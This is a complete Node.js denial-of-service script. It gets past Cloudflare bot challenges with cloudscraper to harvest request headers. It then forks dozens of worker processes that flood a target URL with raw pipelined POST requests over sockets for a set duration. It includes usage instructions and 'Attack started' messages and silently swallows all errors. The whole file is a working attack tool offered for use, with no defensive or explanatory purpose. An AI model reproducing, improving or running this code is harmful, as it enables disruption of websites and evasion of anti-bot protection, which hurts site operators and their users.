require('events').EventEmitter.defaultMaxListeners = 0;
const cluster = require('cluster');
const numCPUs = require('os').cpus().length + 20; // Thêm 5 luồng
const path = require('path');
const url = require('url');
const CloudScraper = require('cloudscraper');
const querystring = require('querystring');

if (process.argv.length !== 5) {
    console.log(`
Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <150>`);
    process.exit(0);
}

const target = process.argv[2];
const time = process.argv[3];
const req_per_ip = process.argv[4];
const host = url.parse(target).host;

let getHeaders = function () {
    return new Promise(function (resolve, reject) {
        CloudScraper.get({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 1
        }, function (error, response) {
            if (error) {
                console.log(`ERROR: ${error.message}, retrying the request.`);
                return start();
            }
            let headers = '';
            Object.keys(response.request.headers).forEach(function (i) {
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });

            resolve(headers);
        });
    });
}

function send_req(headers) {
    const net = require('net');
    const client = new net.Socket();

    client.connect(80, host);
    client.setTimeout(5000);

    for (let i = 0; i < req_per_ip; ++i) {
        const postData = querystring.stringify({
            // Thêm các tham số POST ở đây nếu cần
        });

        client.write(
            `POST ${target} HTTP/1.1\r\n` +
            headers + 
            `Content-Length: ${Buffer.byteLength(postData)}\r\n` +
            '\r\n' +
            postData
        )
    }

    client.on('data', function () {
        setTimeout(function () {
            client.destroy();
        }, 2000);
    });
}

let init = function () {
    getHeaders().then(function (result) {
        console.log('Attack started !');
        setInterval(() => {
            send_req(result);
        });
    });
};

if (cluster.isMaster) {
    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
    });
} else {
    setTimeout(() => {
        console.log('Attack ended.');
        process.exit(0);
    }, time * 1000);

    init();
}

// To avoid errors
process.on('uncaughtException', function (err) {});
process.on('unhandledRejection', function (err) {});
